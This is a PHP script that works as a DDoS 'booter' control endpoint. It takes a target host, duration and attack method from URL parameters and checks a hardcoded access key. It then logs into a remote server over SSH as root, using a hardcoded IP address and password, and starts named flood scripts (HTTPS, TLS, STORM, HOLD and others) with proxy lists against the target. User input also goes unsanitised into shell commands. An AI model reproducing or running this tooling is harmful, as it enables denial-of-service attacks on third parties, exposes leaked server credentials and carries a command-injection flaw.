<?php
error_reporting(E_ALL);
ini_set('display_errors', '1');

if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['key'])) {
    $host = $_GET['host'];
    $port = $_GET['port'];
    $time = $_GET['time'];
    $method = $_GET['method'];
    $key = $_GET['key'];

    $username = 'root';
    $ip = '143.198.202.89';
    $ports = '22';
    $password = 'leo@123';

    $allowedKeys = ['starpez'];

    if(!in_array($key, $allowedKeys)) {
        die("Invalid Key");
    }

    switch ($method) {
        case 'TCPSSH':
            $command = "cd /root/ && screen -dm node tcpssh $host 22 root $time";
            break;
        case 'HTTPS':
            $command = "cd /root/ && screen -dm node HTTPS $host $time 8 2 proxy.txt";
            break;
        case 'HTTP-X':
            $command = "cd /root/ && screen -dm node HTTP-X $host $time 8 2 proxy.txt";
            break;
        case 'QUANTUM':
            $command = "cd /root/ && screen -dm node QUANTUM $host $time 8 2 proxy.txt";
            break;
        case 'FLOODS':
            $command = "cd /root/ && screen -dm node floods $host $time 8 2 proxy.txt flood";
            break;
        case 'TLS':
            $command = "cd /root/ && screen -dm node TLS $host $time 8 2 proxy.txt";
            break;
        case 'HOLD':
            $command = "cd /root/ && pm2 start HOLD.js --name 'hold' -- $host $time 8 2 proxy.txt";
            break;
        case 'BROWSER':
            $command = "cd /root/ && screen -dm node STATIC $host $time";
            break;
        case 'STORM':
            $command = "cd /root/ && screen -dm node Storm $host $time 8 2 proxy.txt";
            break;
        case 'MIX':
            $command = "cd /root/ && screen -dm node MIX $host $time 8 2";
            break;
        case 'RAW':
            $command = "cd /root/ && screen -dm node HTTP-RAW $host $time";
            break;
        case 'NINJA':
            $command = "cd /root/ && screen -dm node ninja $host $time";
            break;
        case 'REFRESH':
            $command = "cd /root/ && pm2 delete hold";
            break;
        case 'UPDATE':
            $command = "cd /root/ && screen -dm node scrape.js && cd /root/ && apt update -y && apt upgarde -y";
            break;
        default:
            die("Unknown method");
    }

    if(!function_exists("ssh2_connect")) {
        die("function ssh2_connect doesn't exist");
    }

    if(!($con = ssh2_connect($ip, $ports))){
        die("Invalid Vps Ip Or Vps Port.");
    }

    if(!ssh2_auth_password($con, $username, $password)) {
        die("Invalid Vps Password Or Username.");
    }

    $shell = ssh2_shell($con, 'vt100', null, 80, 40, SSH2_TERM_UNIT_CHARS);
    if(!$shell) {
        die("Unable to establish shell.");
    }

    fwrite($shell, $command . PHP_EOL);
    sleep(2);
    $data = '';
    while($buffer = fread($shell, 4096)) {
        $data .= $buffer;
    }
    fclose($shell);

    if(empty($data)) {
        echo "No output received.";
    } else {
        echo "Attack Sent To $host using $method Methods";
    }
} else {
    echo "The contents of his Parameter are like this: http://$ip/?host=&port=&time=&method=&key=";
}
?>